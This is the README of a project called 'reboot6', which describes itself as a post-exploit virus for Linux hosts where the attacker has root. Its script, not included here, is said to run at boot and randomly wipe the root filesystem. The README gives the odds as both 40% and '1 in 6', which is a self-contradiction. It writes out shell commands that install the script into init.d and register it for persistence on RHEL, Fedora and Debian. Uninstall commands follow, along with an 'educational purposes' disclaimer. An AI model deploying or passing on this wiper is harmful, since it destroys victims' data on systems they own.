# reboot6

---
An init.d reboot virus that's inspired from Russian Roulette Linux.
This is a post exploit/virus that needs root privs and full access on the host/remote host in order for this to work.
What it does: creates an init process that has a 40% chance of wiping the root ( / ) of the file system durring the bootup (reboot) process.
Why 40%? Why not 100%? Because I'm not a evil person. And this gives the Victim machine the possibilty to remove the exploit/virus.
Like Russian Roulette (Linux), there is a 1 in 6 chance you lose.
*This software is intended only for educational purposes. USE AT YOUR OWN RISK.
The project author and all contributors cannot be held liable for damage or loss of data resulting from the use of this repository's code.*
---

To INSTALL the script:
# ALL SYSTEMS
```sh
cp reboot6.sh /etc/init.d/reboot6.sh
```
# RHEL and Fedora
```sh
chkconfig --add /etc/init.d/reboot6.sh
```
```sh
chkconfig --level 125 /etc/init.d/reboot6.sh on
```
```sh
ln -s /etc/init.d/reboot6.sh /etc/rc2.d/S35reboot6
```
# Debian and Deriatives
```sh
update-rc.d reboot6.sh defaults 10 2 3 4 5 .
```
# To UNINSTALL the script:
# RHEL and Fedora
```sh
chkconfig --level 125 /etc/init.d/reboot6.sh off
```
```sh
chkconfig --del /etc/init.d/reboot6.sh
```
# Debian and Deriatives
```sh
update-rc.d reboot6.sh disable
```
```sh
update-rc.d reboot6.sh remove
```
# ALL SYSTEMS
```sh
rm /etc/init.d/reboot6.sh
```
